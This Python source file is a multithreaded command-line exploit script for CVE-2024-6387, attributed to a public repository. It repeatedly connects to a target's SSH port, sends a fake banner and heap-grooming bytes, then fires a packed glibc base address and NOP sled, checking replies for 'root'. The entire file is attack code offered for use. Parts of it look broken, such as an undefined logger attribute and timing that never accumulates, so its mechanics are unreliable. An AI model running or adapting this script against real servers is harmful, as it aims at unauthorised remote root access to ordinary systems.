# -------------------------------------------------------
# Copyright (c) [2024] Nadege Lemperiere
# All rights reserved
# -------------------------------------------------------
# Exploit for CVE-2024-6387 (from https://github.com/d0rb/CVE-2024-6387)
# -------------------------------------------------------
# Nadege LEMPERIERE, @25th November 2024
# Latest revision: 25th November 2024
# -------------------------------------------------------

# System includes
from logging    import config, getLogger
from os         import path as lpath
from socket     import socket, AF_INET, SOCK_STREAM
from time       import time, sleep
from struct     import pack
from threading  import Event, Thread
from ast        import literal_eval

# Click includes
from click      import option, group


# Logger configuration settings
logg_conf_path = lpath.normpath(lpath.join(lpath.dirname(__file__), 'logging.conf'))

#pylint: disable=W0719, R0902
class Workflow:

    def __init__(self, ip, port, attempts, threads, glibc, command):
        """
        Constructor
        Parameters :
        Returns    :
        Throws     :
        """

        # Initialize logger
        self.__logger = getLogger('workflow')
        self.__logger.info('INITIALIZING PROCESSING')

        # Set members
        self.__ip = ip
        self.__port = port
        self.__attempts = attempts
        self.__threads = threads
        self.__glibc = glibc

        # Load command from file
        try:
            with open(command, 'r') as file:
                self.__command = file.read().strip()  # Read and remove extra whitespace
        except FileNotFoundError:
            self.__logger.error(f"Error: The file '{command}' does not exist.")
        except Exception as e:
            self.__logger.error(f"An error occurred: {e}")

        self.__logger.info(f'Target IP : {self.__ip}')
        self.__logger.info(f'Target port : {self.__port}')
        self.__logger.info(f'Max attempts : {self.__attempts}')
        self.__logger.info(f'Num threads : {self.__threads}')
        self.__logger.info(f'Glibc base : {self.__glibc}')
        self.__logger.info(f'Command : {self.__command}')

    def process(self):

        success_event = Event()
        timing_adjustment = 0

        threads = []
        for attempt in range(self.__attempts):
            if success_event.is_set():
                break

            for _ in range(self.__threads):
                if success_event.is_set():
                    break

                thread = Thread(target=Workflow.exploit_attempt, args=(self.__logger, timing_adjustment, success_event, self.__ip, self.__port, self.__glibc, self.__command))
                threads.append(thread)
                thread.start()
            
            for thread in threads:
                thread.join()

        if success_event.is_set():
            self.logger.info("Exploit succeeded!")
        else:
            self.logger.info("Exploit failed after maximum attempts.")


    """ Class managing invoice processing workflow """
    def setup_connection(ip, port):
        """Establish a connection to the target."""
        sock = socket(AF_INET, SOCK_STREAM)
        sock.connect((ip, port))
        return sock

    def perform_ssh_handshake(sock):
        """Perform SSH handshake with the target."""
        banner = sock.recv(1024).decode()
        sock.sendall(b"SSH-2.0-Exploit\r\n")
        return banner

    def prepare_heap(sock):
        """Prepare the heap for the exploit."""
        payload = b"\x00" * 1000  # Adjust payload size as necessary
        sock.sendall(payload)

    def attempt_race_condition(logger, sock, timing, glibc_base, command):
        """Attempt to trigger the race condition."""
        try:
            payload = pack("<Q", glibc_base) + b"\x90" * 100#+ command.encode('ascii')
            sock.sendall(payload)
            response = sock.recv(1024)
            logger.debug(response)
            logger.debug(response.decode(errors='replace'))
            sock.sendall(b"exit\r\n")
            return b"root" in response
        except Exception as e:
            logger.info(f"Error during race condition attempt: {e}")
            return False

    def exploit_attempt(logger, timing_adjustment, success_event, target_ip, target_port, glibc_base, command):
        """Perform a single attempt to exploit the race condition."""
        sock = Workflow.setup_connection(target_ip, target_port)
        if not sock:
            return

        banner = Workflow.perform_ssh_handshake(sock)
        logger.info(f"Received banner: {banner.strip()}")

        Workflow.prepare_heap(sock)
        sleep(0.1)  # Small delay before triggering the race condition

        success = Workflow.attempt_race_condition(logger,sock, time() + timing_adjustment, glibc_base, command)
        if success:
            logger.info(f"Exploit successful!")
            success_event.set()
        else:
            logger.info(f"Exploit failed")
            timing_adjustment += 0.00001  # Adjust timing slightly

        sock.close()


# pylint: disable=W0107
# Main function using Click for command-line options
@group()
def main():
    """ Main click group """
    pass
# pylint: enable=W0107, W0719

# pylint: disable=R0913
@main.command()
@option('--target-ip', default='')
@option('--target-port', default=22)
@option('--max-attempts', default=1000)
@option('--num-threads', default=10)
@option('--glibc-base',default=0xb7600000)
@option('--command',default='')
def run(target_ip, target_port, max_attempts, num_threads, glibc_base, command):

    """ Script run function """
    workflow = Workflow(target_ip, target_port, max_attempts, num_threads, glibc_base, command)
    workflow.process()

# pylint: enable=R0913

if __name__ == "__main__":
    config.fileConfig(logg_conf_path)
    main()
